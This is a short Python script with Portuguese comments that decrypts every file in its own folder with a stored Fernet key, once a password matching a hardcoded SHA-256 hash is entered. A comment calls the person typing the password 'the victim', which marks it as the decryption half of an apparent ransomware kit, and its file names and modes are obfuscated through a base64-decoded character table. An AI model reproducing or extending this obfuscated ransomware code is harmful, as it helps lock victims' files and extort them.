#! /usr/bin/env python3

#Esta ferramenta serve para criptografar/descriptografar os ficheiros existentes no diretório, onde o ficheiro deste script se encontra!!
#Autor: TuciraTeam
#Ano: 2022


# BIBLIOTECAS
import os 
from cryptography.fernet import Fernet
import getpass
import hashlib
import base64

# ACÇÃO PARA CODIFICAR EM BASE64 O VALOR DA STRING s01 QUE VAI SERVIR PARA OFUSCAR ALGUMAS PARTES DESTE SCRIPT
s01 = "IGFiY2RlZmdoaWprbG1ub3BxcnN0dXZ3eHl6Ll8oKTAxMjM0NTY3ODkK" 
decoded = base64.b64decode(s01.encode('ascii'))
a=decoded.decode('ascii')

# ACÇÃO QUE VAI PROCURAR NO DIRETORIO CORRENTE (ONDE ESTE SCRIPT ESTÁ GUARDADO) OS FICHEIROS QUE QUEREMOS CRIPTOGRAFAR E ARMAZENÁ-LOS NUMA VARIAVEL

s05 = [] 

for file in os.listdir():  
    if file == a[3]+a[18]+a[9]+a[16]+a[20]+a[6]+a[9]+a[12]+a[5]+a[27]+a[16]+a[25] or file == a[27]+a[20]+a[8]+a[5]+a[11]+a[5]+a[25]+a[27]+a[11]+a[5]+a[25] or file == a[4]+a[28]+a[3]+a[18]+a[9]+a[16]+a[20]+a[6]+a[9]+a[12]+a[5]+a[27]+a[16]+a[25]: 
        continue 
    if os.path.isfile(file): 
       s05.append(file) 
       
# ACÇÃO PARA LER A CHAVE CRIPTOGRAFADA GUARDADA NUM FICHEIRO

with open(a[27]+a[20]+a[8]+a[5]+a[11]+a[5]+a[25]+a[27]+a[11]+a[5]+a[25], a[18]+a[2]) as key: 
        secretkey = key.read()
        
# AÇÃO PARA CRIAR UMA PASSWORD, POR FORMA A QUE ESTA, QUANDO FOR ESCRITA PELA VITIMA, ACIONE A ACÇÃO QUE VAI DESCRIPTOGRAFAR OS FICHEIROS E/OU PASTAS EXISTENTES NA VARIVEL s05

s04 = a[35]+"6070d4bf934fb"+a[31]+"d4b06d9e2c46e346944e3224"+a[35]+"4900a435d7d9a95e6d7435f"+a[36] #-------> Devem alterar o hash-sha256 da password que querem utilizar (neste exemplo a password é teste)
s03 = getpass.getpass("\nDigite a Password para Descriptografar os Ficheiros\n") 
s02 = hashlib.sha256(s03.encode())

if s02.hexdigest() == s04: 

# ACÇÃO QUE VAI DESCRIPTOGRAFAR OS FICHEIROS E/OU PASTAS EXISTENTES NA VARIVEL s05 COM A CHAVE CRIPTOGRAFADA GUARDADA NUM FICHEIRO

        for file in s05: 
                with open(file, a[18]+a[2]) as thefile: 
                        contents = thefile.read()
                contents_decrypted = Fernet(secretkey).decrypt(contents) 
                with open(file, a[23]+a[2]) as thefile:
                        thefile.write(contents_decrypted) 
                print('\033[32m'+"Ficheiro:", file,"----> Descriptografado"+'\033[0;0m')
               
else:
    	print("\nDesculpa, Password Errada...Tenta de Novo!")
